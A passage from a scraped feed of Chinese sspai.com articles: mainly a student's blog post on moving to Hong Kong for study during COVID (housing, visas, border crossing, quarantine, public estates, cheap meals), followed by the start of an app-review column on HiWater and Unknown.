车公庙附近</figcaption></figure><h2>怎么去香港</h2>\n<p>在开始讲述我的港漂生活之前，想先和大家分享一下我来港前的各项准备工作。</p>\n<h3>租房</h3>\n<p>在办理签证之前，我们需要先找好住处。因为港校的研究生基本上不能分配到宿舍，所以绝大部分的学生都需要自己找房子租。</p>\n<p>在香港，非本地研究生租房基本上有三种选择，分别是租村屋、租普通商品房和长租酒店。</p>\n<h4>村屋</h4>\n<p><strong>定义：</strong>指位于学校附近村子里的别墅，既可以整套出租，也可以分开出租给不同人。</p>\n<p><strong>优点：</strong>价格会相对低廉。和普通商品房相比，相同价格下往往能获得更大的个人使用空间。有的村屋还会配有院子。地理上通常会更加靠近学校（对于在一些位置稍微偏僻学校就读的学生会更有吸引力）。</p>\n<p><strong>缺点：</strong>因为位置偏僻，通常配套设施（交通、饮食、娱乐）不是很好。</p>\n<p><strong>适合人群：</strong>耐得住寂寞，预算有限，对私人空间比较有要求，动手能力较强的同学。</p>\n<h4>普通商品房</h4>\n<p><strong>定义：</strong>指普通的商品房，可以整租，也有可能重新划分若干区域分别出租。</p>\n<p><strong>优点：</strong>通常配套设施较好，比较靠近商场，食肆或地铁站。</p>\n<p><strong>缺点：</strong>公共活动空间和个人活动空间较少（通常是 5 平方~10 平方），租房价格稍高。</p>\n<p><strong>适合人群：</strong>生活便利性要求比较高的同学。</p>\n<h4>酒店长租</h4>\n<p><strong>定义：</strong>一直住在酒店包间里面。有两人间，三人间等。按照酒店等级以及房间尺寸和附加的服务变动租房价格，丰俭由人。</p>\n<p><strong>优点：</strong>只要肯花钱，足不出户都可以满足基本生活需求，定期有人清洁。</p>\n<p><strong>缺点：</strong>没有或者缺少物理间隔，价格比较贵。</p>\n<p><strong>适合人群：</strong>生活便利性要求极致的同学。</p>\n<p>因为我也是第一次租房，所以想再和大家分享一点经验。我租房时，主要考虑以下几点：</p>\n<ol>\n<li>房屋的法律资质。因为这个涉及租住单位的法律地位，所以需要在租房子前就要确认好。例如，对于公屋（公共屋邨）单位，如果房东只是作为公屋租客，单位是不允许出租的（即所谓「租上租」），如果被发现，会被追究法律责任；</li>\n<li>房屋的基本信息。包括房龄能否接受，房间的面积是多少（香港采用「呎」作为面积计量单位，1 呎≈0.09 平方米）。如果对生活更有追求，可以进一步看看它朝向，配套的家私、厨具、wifi情况，以及与附近的餐厅、药店、百货商店、菜市场的距离等等；</li>\n<li>房间能否隔离。如果房东不允许居家隔离，那么还需要自己先找隔离酒店，产生额外的支出；</li>\n<li>房间的交通通达性，包括距离地铁站，公交车站的距离。一般我更看重前往地铁站的便利程度，因为地铁在时效性来说更有保障，使用八达通乘车也有优惠。</li>\n</ol>\n<p>如果觉得自己找房子麻烦，可以委托中介平台进行寻找；如果不介意事无巨细地过问，也可以自己在论坛上找，加上房东微信后可以在一些留学论坛里看一下房东之前有没有被出租过房屋，服务和态度怎样。不过，无论是委托中介还是自己找房子，针对自己担心的问题先问清楚，且在最后签约的时候再次核实。</p>\n<h3>签证</h3>\n<p>众所周知，因为疫情的原因，目前香港的普通自由行尚未开放。我这次去是作为学生申请的一年多次往返签证（但是在疫情没有根本好转之前，其实就只能够最多来往一次）。学校发放录取通知书后，会有关于如何向香港海关申请 visa label（就是「粉签」）的指引，一步步操作就好。大概需要等 2~3 个月，粉签会在开学前三个月左右拿到手。</p>\n<p>等拿到粉签后，就可以前往出入境大楼办理逗留签证（就是「D 签」）了。需要带上通行证、身份证和粉签及相关文件（学校会用信封装好），文件最好自行复印一份，到时候出入境大楼的工作人员会收取一份留底。</p>\n<p>在申请了留学生一年多次往返的逗留签以后，等一周左右就可以拿到，我带上身份证就可以在自助发证机拿到。</p>\n<h3>行李</h3>\n<p>需要带去香港的东西，我主要分两部分，必带和选带。</p>\n<p><strong>必带：</strong></p>\n<ol>\n<li>各类证件，如内地身份证、通行证、粉签、疫苗接种凭证（如有）；</li>\n<li>若是来港读研，需要带上中英文成绩单、中英文学位证明、中英文毕业证明以备查验；</li>\n<li>带上适量现金和银行卡（注意：进出中国海关不能携带超过 20000 元人民币的现钞和等值 5000 美金的外币现金；进入香港海关（跨境运送）不能够携带超过 120000 港币，否则应自行申报）；</li>\n<li>笔记本电脑，转换插座；</li>\n<li>根据自己需求觉得需要带的其他物品。</li>\n</ol>\n<p><strong>选带：</strong></p>\n<ol>\n<li>生活类用品：碗碟，筷子，拖鞋，保鲜袋；</li>\n<li>电器：电饭煲，移动充，平板电脑等；</li>\n<li>药品：常用的应急药物，包括发烧，胃痛，喉咙痛的特效药。</li>\n</ol>\n<h2>过关的流程</h2>\n<p>目前因为疫情管控原因，只有<strong>深圳湾</strong>和<strong>港珠澳大桥</strong>两个陆路海关以及<strong>香港国际机场</strong>一个空港可以入境香港。</p>\n<ol>\n<li>南方地区的小伙伴建议搭乘高铁到深圳或珠海，再打车或者转乘公交到口岸过关；</li>\n<li>如果是北方地区的同学可以考虑选择直飞香港国际机场。</li>\n</ol>\n<p>因为我从广州出发，所以就选择从深圳湾过关，整体会更加方便。如果从港珠澳大桥过关，需要先到珠海，绕一个圈，再从西部的赤腊角进入香港，就会繁琐一些。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/24/818cefad83039f16f209d091d89ba43b.png\"><figcaption>目前三个入境口岸的位置</figcaption></figure><p>因为疫情管制原因，在深圳湾口岸「一地两检」的过程中需要出示不同的二维码作为我们的健康证明。为了节省时间，可以提前填写相关信息并生成好二维码（24 小时有效），配合好海关人员检查也能加快通关速度。</p>\n<p>黑码：海关指尖服务健康申报码，大陆海关一定会检查；</p>\n<p>绿码：粤康码通关凭证，大陆海关可能需要检查；</p>\n<p>粉码：香港卫生署健康申报表，香港海关一定会检查（如果发现填写后无法提交，可以尝试换一个界面语言，亲测有效）</p>\n<p>等香港海关检查完证件，会给你发放说明入境时间和允许逗留时间的小白条（就是「landing slip」），戴好定位手环，嘱咐完相关事项就可以离开海关大楼了。</p>\n<p>不过可能是快要到开学季的原因，虽然有疫情这个「debuff」，但是等待过关的人其实并不少，我从开始排队等待进入海关大楼，到佩戴好定位手环出大楼，大概用了四个小时，后几天过关的同学已经需要六个小时才能过关了。目前深圳湾海关通关时间最晚到 22：00，大家可以安排好自己的时间，尽早开始过关，8：30 人流还不算多，从 9 点到 12 点到 16 点，时间越晚，需要等待的时间也会更长。</p>\n<h2>前往住处，开始隔离</h2>\n<p>过关后，需要自行搭乘交通工具前往住处。因为我找不到同学一起拼出租车，单人乘坐出租车费用太高，基本不考虑。原本我打算搭乘深圳湾口岸的公交到天水围，再搭乘地铁到住处。但是口岸的公交班次比较稀疏，通常 45 分钟到一小时一班。等我出来的时候，目送了一辆直达地铁站的公交离开，下一班在一小时后才能发车。为了不让出租车叔叔赚我的钱，犟劲一上来，我搭了三趟公交车，换乘了两次才最终到达了住处。</p>\n<p>到达住处后，隔离生活就开始啦！隔离期间最重要的是记得按照工作人员的提示在特定的日子自行取得并寄送唾液样本送检。大家可以善用舍友互相提醒。因为我们本人不能够出门，唾液样本需要让别人寄送到收集点，过关时发的检疫小礼包里面会有相关寄送公司的联系方式，但是需要提前一天才能够预约。如果忘记了也没关系，可以在小程序中搜索「花生留学平台」，上面也有同学可以接单帮忙寄送，价格通常还会更加优惠。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/28/32c6e9a5097f0bdb856624f24a1db59f.png\"><figcaption>对比一下，官方提供的三家跑腿公司每次收费需要100元</figcaption></figure><h2>隔离后的闲逛</h2>\n<p>结束隔离以后，终于有机会出去逛逛了。</p>\n<p>我其实对香港不算陌生，生于珠三角地区的我从小就受到香港的文化产品影响，对我来说，香港不同地区都有自己的特殊的符号。</p>\n<p>香港岛：充满着异域风情的建筑风格，大理石的外墙，精致的煤气路灯；</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/29/64e014d93d6eaac892b84d1c0b696039.jpg\"><figcaption>中环 大馆</figcaption></figure><p>九龙半岛：拥挤的霓虹灯牌张牙舞爪地从道路两旁伸出，街边小档卖力地招徕客人，时不时有豪车轰鸣着掠过；</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/30/ddf813fb5e8820776bf10f9387b004f6.jpg\"><figcaption>旺角 通菜街</figcaption></figure><p>离岛：鲜美的海鲜，郁郁葱葱的植物，永远明媚的蓝天，弯弯曲曲的山路。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/29/0effdd353ac75620ac7ddd5a3485871c.jpg\"><figcaption>南丫岛</figcaption></figure><h3>沙田：居住在缤纷的记忆里</h3>\n<p>我首先在我的住处附近溜达了下。但其实我对于新界，对于沙田知之甚少。</p>\n<p>之前每次过关，都是在罗湖口岸匆匆坐上地铁前往油尖旺区购物，或者前往香港岛爬太平山。「大学」、「火炭」、「沙田」，这些地名对于我来说就只是路上一个个迅速掠过的站牌而已。真要我搜索一点关于新界的记忆或者印象，那就是荒芜的山地，一座连着一座的小山丘里偶尔掠过的村庄。但是等我真正有机会四处探索的时候，我发现其实并非如此。</p>\n<p>我居住的地方是沙田区，位于新界东部。随着香港人口的不断发展，沙田被规划成为香港的卫星城，并进行相应的填海造陆和新城镇建设计划。整个计划从 1973 年开始推进，并在 80 年代对沙田管辖区域进行进一步的扩建，逐渐形成现在的规模。可能沙田区是卫星城，本身定位就是为在城市核心区工作的人提供住处，所以在我居住的地区周围有大量的屋邨。</p>\n<p>我查阅了一些资料，新界居住了房委会公营永久性住房一半的居住人口，超过六成的公屋实用面积 40 平方以上，截至 2020年，人均公屋面积是 13.4 平方米。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/51a5ef565e8ac2f455a301a9f7af3439.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/814b39c54223842605c8d147db159037.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/3361e2e88362b3fbcd4b83223262a739.png\"><figcaption><a href=\"https://www.thb.gov.hk/tc/psp/publications/housing/HIF2020.pdf\">房委会数据</a></figcaption></figure><blockquote><p><a href=\"https://zh.wikipedia.org/wiki/%E9%A6%99%E6%B8%AF%E5%85%AC%E5%85%B1%E5%B1%8B%E9%82%A8%E5%88%97%E8%A1%A8\">屋邨，又称为「公共屋邨」，由政府、志愿团体或私营企业兴建，再以低廉价格出租予低收入市民的住宅。截至 2021 年 8 月，香港共有 251 个公共屋邨，单位总计超过 85 万个。</a></p></blockquote>\n<p>因为香港的屋邨主要由三个机构提供，不同机构建设的屋邨可能有区别，但是屋邨也有一些共同的特点：</p>\n<ol>\n<li>屋邨基本上以大型的高层房屋为主，通常超过二十层。如果站在远处看，可以看到屋邨高大的外墙布满密密麻麻的窗户，像一只巨兽横卧在地上；晚上，灯光从一个个小小的窗户中透出，如点点繁星般梦幻。</li>\n<li>每个屋邨由若干大楼组成，有自己的配套设施，如食肆、医院、幼儿园、健身设施、菜市场、教堂，甚至自己的喷泉和滚轴溜冰场等，是配套齐全的大型综合社区；</li>\n<li>当然，对我来说，屋邨最明显的特点是外形规整，有大量重复的几何构造，以及明亮耀眼的色彩，有的屋邨墙壁上还会有艺术家的涂鸦。如果处理好光线和线条引导光线还是很容易出片的。</li>\n</ol>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/14d595650b3ff3e835aa15816287fe84.jpg\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/7b2c8f283c0674b7bc38ea41ff779d23.jpg\"><figcaption>沙田区 乙明邨</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/e269858a0c0e1a0feaf95d38ba7c2dd8.jpg\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/a58b181b0041c4a83aac0abc321b6806.jpg\"><figcaption>沙田 沙角邨</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/17c35ee0ea845d5cf0d1b12511b6f7b9.jpg\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/97dca5140fbb0736d678f0ea2a2725b5.jpg\"><figcaption>沙田 沥源村</figcaption></figure><p>当然，要说最出名的公共屋邨，还是位于「彩虹」地铁站附近的彩虹邨。但是我认为不同的屋邨都有自己有趣的角落，只要多找找就能看到啦。</p>\n<p>屋邨最吸引我的，除了外墙缤纷的颜色，其实还有代表了尘封在我脑海很久的，对于香港生活的记忆和印象。</p>\n<p>我记得，我在屋邨闲逛的那天下午，阳光明媚，透过枝叶在墙面留下斑驳的光影。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/30/24c54d107daaca44a0109271311ef497.jpg\"><figcaption>沙田 沙角邨</figcaption></figure><p>我记得，在屋邨的滚轴溜冰场前，一个小女孩绕着一圈又一圈。不远处，一个大叔在大树下津津有味地看着报纸。走在房屋过道，有时候会听到电视节目的声音从虚掩着的门后传出来。啊，还是熟悉的节目播报声。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/30/82ea15394ecca0a8bea9aea575945546.jpg\"><figcaption>沙田 乙明邨</figcaption></figure><p>我想起小时候看香港电视台的天气预报，因为每天都会看，以至于主持人要说什么都能背下来：</p>\n<blockquote><p>本港录得最高气温三十二摄氏度，相对湿度百分之八十三，天气酷热，吹和缓嘅东至东南风，午间有几阵骤雨，展望未来有阳光……</p></blockquote>\n<p>接着，一个小人走入屏幕，然后吹着口哨离开。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/26/a05ff758d67f9c2a7aaa4e6a8782ae9c.png\"><figcaption>跟住落来睇下天气先生嘅预测</figcaption></figure><p>想起了我小时候在周四和周五一放学就会冲回家，因为要赶上 17：15 到 17：45 电视播放的剧集。周末会找各种理由流出家门，然后和同学坐在楼梯上玩游戏机。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/29/11eb2433904494cf8b0121832a7ff57d.jpg\"><figcaption>沙田 沥源村</figcaption></figure><p>又想起了周末我爸带我去吃好吃的，通常会是牛腩粉，但是一定不能告诉我妈，因为我妈觉得牛肉容易上火，酱汁很咸。但是我依然很喜欢吃，特别是捧着大碗大快朵颐，嘴里面被牛肉丸和牛腩塞满，心里面是很有成就感的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/29/43fb804cd43fdf496f5d8abc0f712553.jpg\"><figcaption>沙田 沙角街市</figcaption></figure><p>我总是很怀念曾经的时光，因为我已经不需要体验那段时光经历里的不安，伤心，愤怒，不解。后来，我家电视机坏掉了，不能再看香港的电视节目；那家牛腩粉店结业了；从小一起玩的朋友们也慢慢一个个搬走了……于是这些记忆就被封存起来，许久不被触碰。</p>\n<p>不过这些童年的瞬间，在我漫步屋邨时一个接一个在我脑海里复苏。以致于我看到一个个在广场疯跑，追着妈妈吹出来泡泡的小朋友，虽然之前素未谋面，但还是感觉似曾相识，心里面是对他们满满的羡慕。</p>\n<p>他们生活在缤纷的色彩中，我生活在缤纷的记忆里。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/30/ec4e59b2975866b9e9b63ce718df82b6.jpg\"><figcaption>沙田 大围</figcaption></figure><h3>中环 &amp; 上环：最西方和最东方的，最传统和最现代的</h3>\n<p>最近几天，终于有时间再去一次港岛，在中环和上环逛了一下。</p>\n<p>逛了一下午，感觉有两种定位的纠结在港岛人心目中挥之不去。香港岛是清政府最早割让给香港的租界，因此，这里的建筑和其他地区相比，更具有异国风景。无论是大馆（原香港中区警署驻地），还是巷子中随处可见的咖啡店和酒吧以及艺术涂鸦，这里仿佛是一个充满外国风情的圈子。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/29/2b92a7fb97688d4fc07d578d1b388a03.jpg\"><figcaption>中环街上随处可见的酒吧和外国人</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/30/330ace07989bf990e46ae30aff3ad5de.jpg\"><figcaption>中环 嘉咸街</figcaption></figure><p>但是又有一部分的街区，一部分的港岛在执拗地坚守属于中华文化的一部分。文武庙中，香火依然鼎盛；摩罗街上，古董书画随处可见；盂兰盆节到了，走在路上经常会闻到烧香的味道，大楼的公告栏上详细说明化宝盘的位置；活化后的中环街市重新迎客，许多白发苍苍的老人重回旧地，和晚辈们诉说街市以前杀鸡宰羊的位置；满街手写的繁体商铺名称，让我很确信他们对传统文化的执念。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/29/2ba9fbc5217db40790f1070e71b9a138.jpg\"><figcaption>上环 文武庙</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/30/81c5b51c3c9b2a92976b8720ed157ad8.jpg\"><figcaption>中环 中环街市</figcaption></figure><p>香港就是这样一个能让你时不时感到纠结和疑惑的地方。</p>\n<p>你能够看到高楼大厦，往上仰望得你脖子疼，「嘟嘟嘟嘟」的红绿灯提醒声音仿佛一直在催着路人往前走，硕大的霓虹灯牌和广告牌仿佛永远不会关掉。</p>\n<p>你也能看到叔叔阿姨坐在花坛上聊天，菜市场里买菜阿姨给送几块牛肉干给熟识的朋友，和经常去的几个摊档主人打招呼。</p>\n<p>可能也正是对两种截然相反的生活信条的共同追求，造就了现在的香港吧。</p>\n<h2>饮食：我有独特的薅羊毛技巧</h2>\n<p>香港的生活消费水平很高，如果是在一些购物商场或者热门购物街道吃饭，每顿的消费可以轻松到100块。虽然对于香港人来说，可能这算是正常的消费水平，但是我作为一个大陆来的穷学生，就是不想让他们赚那么多钱😜。在不断的摸索中，我也慢慢找到了薅羊毛的技巧，基本上可以每顿能维持在 45 港币（即 37 元人民币）以内。</p>\n<h3>不愿出门</h3>\n<p>如果不出门，那么就只能叫外卖了。一般来说，在香港叫外卖不会便宜，配送费从 5 元至 25 元不止，有的还必须加上 10 元的小费，如果需要免掉配送费，则通常需要消费超过 100 元以上。</p>\n<p>但是换个角度，「打不过就加入」，如果单点觉得贵，可以选择和舍友一起点外卖，有一些餐厅会有满 90 元优惠 40 元的优惠，或者有买一送一的优惠，这个时候和舍友一起点会比较划算。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/29/484a560cf392df227206bbed6470c4fc.png\"><figcaption>Uber eats和Food panda是比较常用的外卖平台</figcaption></figure><p>不过也有例外，如果碰巧你家楼下有中小型的茶餐厅，可以和老板娘混个脸熟，直接拿外卖电话和菜单。在需要的时候直接打电话订餐即可，这样既没有平台费用，如果恰逢不是很繁忙的时间段还可能可以免费送餐上门。</p>\n<h3>愿意出门</h3>\n<p>如果愿意出门，可以选择的方案就更多了：</p>\n<h4>菜市场</h4>\n<p>真正久经江湖的叔叔阿姨是从来不会去超市买菜的，菜市场才是他们真正厮杀的战场。超市里的五花肉 300g 卖 39 元，在菜市场 500g 卖 58 元；超市里的菜心 200g 卖 12 元，在菜市场 500g 卖 12~16 元，还送三根葱；烧好的蜜汁鸡翅 4 块 20 元，彩椒 3 个 10 元，鸡蛋 20 个 15 元……如果在菜市场买菜，能够比在百佳和惠康这种超市便宜 20%~40%，还有更多精彩等待你发现。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/29/e2e4cf5d6a87160f12ea8761eba45c14.jpg\"><figcaption>沙田 沙角街市</figcaption></figure><h4>海皇粥店</h4>\n<p>主要经营各种扒餐（标配：饭+煎蛋+扒+酱汁+一杯饮料，煎蛋可以换成午餐肉、香肠等，酱汁亦有多种选择），粥类和炒面，基本款式价格在 30~50 元左右。该店还支持支付宝和微信直接付款，所以碰巧没带够现金也不用担心。在工作日可以询问一下是否有学生优惠，能够再优惠 4 元左右。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/7966a86ac7f8ecb9a516b970b3209f56.jpg\"><figcaption>这款套餐是42元</figcaption></figure><h4>大快活</h4>\n<p>主要经营各种扒餐（标配饭+煎蛋+扒+酱汁+一杯饮料，酱汁亦有多种选择），基本款式价格都在 40~50 元左右。同样支持支付宝和微信直接付款。在工作日可以询问一下是否有学生优惠，能够再优惠 4 元左右。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/30/aa33cdbce183274f1c576f0a7957a3e9.jpg\"><figcaption>这款套餐是40元</figcaption></figure><h4>外卖自提</h4>\n<p>如果想吃外卖，但是又想不花配送费，可以选择先打电话订餐，稍后再前往自提。这样只需要付 1~2 块打包费，且能够完全免去配送费。有一些小型的餐厅只提供自提而不提供外送，所以，如果愿意自取，可选择餐厅的范围还会大一点。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/29/d9b358b5395cc17170d90e01c2412552.png\"><figcaption>一些餐厅外卖自提套餐还是挺划算的</figcaption></figure><h4>学校饭堂</h4>\n<p>学校饭堂的价格基本上能维持在低于市面正常价格线的水平上。我要就读的学校有差不多 40 个饭堂，所以丰富性也不用担心了。比如学校的套餐价格基本能够维持在 30 元~40 元，相对于外部的茶餐厅或者其他饭店来说，普遍能够低 10~20 元，分量挺足，一些菜式味道也很不错。有时候赶时间上课，或者下课后回家懒得做饭，学校饭堂是不错的选择。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/3adbd7d89d117fd0fb9cb6cee5adff12.jpg\"><figcaption>李卓敏基本医学大楼 套餐37元</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/19/84bc9dc2526c37eddb15211ce4a184f7.jpg\"><figcaption>联合书院饭堂 套餐40元</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/19/76b7d87b890b0bf97e563f85579d64c3.jpg\"><figcaption>新亚书院饭堂 套餐33元</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/19/c79fd855dae90ff5c5c3133d604984df.jpg\"><figcaption>医学院（威尔斯亲王医院）饭堂 套餐36元</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/19/a07aaa029577190b9a3ed9fce33d6e4b.jpg\"><figcaption>和声书院饭堂 套餐42元</figcaption></figure><h2>结语</h2>\n<p>这次来香港，感觉既熟悉又陌生。自己不再是作为一名游客去看待这座城市，而是作为一名香港的市民。但是，还是那个熟悉的语言环境，那个熟悉的文化氛围。漫步在城市，放眼望去，看到的每一帧画面，仿佛都可以唤起我已被淡忘的回忆。这个时候我才发现，香港的电视剧、电影、综艺、音乐、甚至只是闭上眼时，心里面想象中属于香港的名词；霓虹灯、番茄牛肉通心粉、繁体字的牌子……其实一直陪伴着我，从来没有远去，只是在我的脑海里沉睡，等待一次苏醒。</p>\n<p>来到香港才十几天，但是我仿佛已经彻底习惯了这里的生活。在屋邨拍照的时候，会和误以为我是房屋协会来检查晾晒的地拖是否干净整洁的老婆婆唠嗑上几句；回家或者出门的时候，会和楼下大堂的管理员点点头示意；在菜市场混迹于一大群叔叔阿姨中间，和食材和老板斗智斗勇……大概这就是我心里面的香港。当时间像一双手把一段经历拉长，再拉长，这个时候，杂质和浮尘被除掉，而我也有机会认真观察生活的纹理。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/30/ed6c6dfb3163b23ea6c0efbcc6587ff2.jpg\"><figcaption>中环 皇后大道中附近</figcaption></figure>\n","link":"https://sspai.com/post/68195"},{"title":"派评 | 近期值得关注的 App","date":"2021-10-04 08:31:15","description":"\n<p>本期《派评》的内容有：</p>\n<ul>\n<li>📷 iOS 专业相机应用 NOMO RAW 迎来大版本更新。</li>\n<li>🥛 除了记录喝水还不够，HiWater 还想帮你控制热量。</li>\n<li>📈 iWork 办公三件套迎来大更新，让线上协作更加便利。</li>\n<li>……</li>\n</ul>\n<p>你可以通过文章目录快速跳转到你感兴趣的内容。如果发现了其它感兴趣的 App 或者关注的话题，也欢迎在评论区和我们进行讨论。</p>\n<h2>不容错过的新 App</h2>\n<p>虽然少数派一直在为大家发发现和介绍各平台上的优质 App，但仍有不少设计、功能、交互、体验都非常优秀的 App，还没有被我们发掘和介绍。它们可能是一款老 App，也可能是近期上架的新 App，我们会在这里介绍给你。</p>\n<h3>HiWater：光记录喝水还不够，控制热量也很重要</h3>\n<ul>\n<li>平台：iOS / iPadOS</li>\n<li>关键词：饮水记录、健康追踪</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@Vanilla\" user-id=\"bs2ov5lb34tch278f9ag\" href=\"https://sspai.com/u/whoops\">@Vanilla</a>：作为老牌喝水应用 WaterMinder 的用户，我对这款 App 已经非常满意。可是，当我看到 HiWater 后，我才后知后觉得发现 WaterMinder 缺少了点什么，那就是对摄入热量的提醒。</p>\n<p>在「今日」标签页，HiWater 展示了当日的饮水进度和详细的记录历史，这是它与其它喝水应用相同的功能。不过，每日补水目标下方的饮水金字塔就非常有意思了，它将常见饮品分为 6 个健康等级，用来衡量各类饮品的摄入比例。金字塔底端的白水是健康补水的首选，而位于顶端的饮品应加以控制。也就是说，我每天除了要完成饮水数量的目标，还要注重摄入水分的质量，如果热量太高导致超标，也是一件得不偿失的事情。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbi7db34teh0gc1kig.jpeg\"></figure><p>在设置界面中，我可以调整「饮水金字塔」的比例：对正常用户来说白水的比例要大于等于 60%，而对于需要控制热量输入的人群来说白水的比例要大于等于 70%，大家可以各取所需。在「饮品目录」标签页中，我可以查询到每一类饮品每 100 毫升所含的热量，根据热量大小从 LV1 到 LV6 分门别类。每次我记录饮水，体积和热量会同时被记录，然后反映到每日补水目标和饮水金字塔两个不同的监测进度上。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbi7lb34teh5fkvjt0.jpeg\"></figure><p>最后值得一提的是 HiWater 添加饮品记录的方式，除了常规的应用内添加，还可以通过小组件和 Siri 捷径来快递添加相应的饮品，非常方便。HiWater 的小组件可以点名表扬，因为它不是单纯地展示数据，而是可以进行交互，就像快捷指令 App 的小组件一样，点击就会触发相应的动作。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbi7tb34teit0pn1ng.jpeg\"></figure><p>如果说 HiWater 在设计方面可能还不如 WaterMinder 来得更加美观，但是在功能科学性和实用性方便已经远远超过后者，而我也自然而然地投奔了 HiWater 的阵营。目前，HiWater 可以在 <a href=\"https://apps.apple.com/cn/app/hiwater-%E5%81%A5%E5%BA%B7%E9%A5%AE%E6%B0%B4%E6%8C%87%E5%8D%97/id1561732866\" target=\"_blank\">App Store</a> 下载，售价 6 元。</p>\n<span class=\"ss-application\" app-id=\"16175\"> </span><h3>Unknown：遇事不决，用它解决</h3>\n<ul>\n<li>平台：Android</li>\n<li>关键词：决策、工具集</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@Noah_Choi\" user-id=\"bs2oudlb34tch2787tn0\" href=\"https://sspai.com/u/69zxdqx8\">@Noah_Choi</a>：俗话说「两个天秤座不能一起出去吃饭，不然会饿死」。作为天秤座，我最讨厌做选择题，无论是买东西、看电影还是吃饭、逛景点，我都要去纠结应该吃什么、看什么、去哪里，眨眼功夫就浪费了半个小时，所以我需要一个找到了一个能替我做选择的工具：Unknown。</p>\n<p>正如其名，Unknown 是一个解决未知问题的应用，它里面包含了 6 种小工具，其中不乏我们所熟知的扔骰（tóu）子和猜硬币功能，其中前者可以通过摇晃手机触发投掷，并且支持自定义骰子数量，掷出后会直接给出点数总和，所以除了做选择题，大家在聚会时还可以在各自手机上安装好 Unknown 来猜大小喝酒呢。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbi85b34teit0pn1o0.png\"></figure><p>随机数和列表功能也非常实用，它们也都允许自定义结果数量。随机数在年会抽奖时非常有用，我们将员工工号的起始和结束分别设定为两个极限就可以，酷安社区中甚至还有用户用该功能「预测」考试分数，可以见得大家已经找到了使用 Unknown 的新方式。</p>\n<p>值得一提的是，Unknown 中有一个「真随机数」开关，其实我们在任何计算机系统中获取的随机数都是通过算法得来的「伪随机数」，甚至部分算法为了给出「符合固有印象」的随机结果，还会屏蔽真随机时可能会出现的重复结果。Unknown 这一功能开启后应用会联网调用 Random.org 的数据，它是通过 <a href=\"https://en.wikipedia.org/wiki/Atmospheric_noise\" target=\"_blank\">Atmospheric Noise</a> 即大气噪声来获取数据的随机性。正是因为这些数据「不靠谱」，所以随机性才会「更靠谱」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5dbi8tb34teit0pn1og.png\"></figure><p>列表功能除了可以决定你今晚吃什么以外，用来给真心话大冒险出题也是个不错的选择，Unknown 允许用户添加多个列表，在答案后面添加「#」和数字就可以设定出现概率。如果是很多很多答案，我们可以直接在电脑上编辑好文本文件导入到 Unknown 里，省时省力又很人性化。</p>\n<p>除了以上常用功能，Unknown 还可以抽扑克牌和给出随机色功能，并且主界面左上角有结果历史记录，说不定大家可以从中发现概率分布的秘密呢。如果你也需要一个能解决大到宇宙奥秘、小到今晚吃什么的小工具，可以前往 <a href=\"https://www.coolapk.com/apk/cn.icyflame.unknown\" 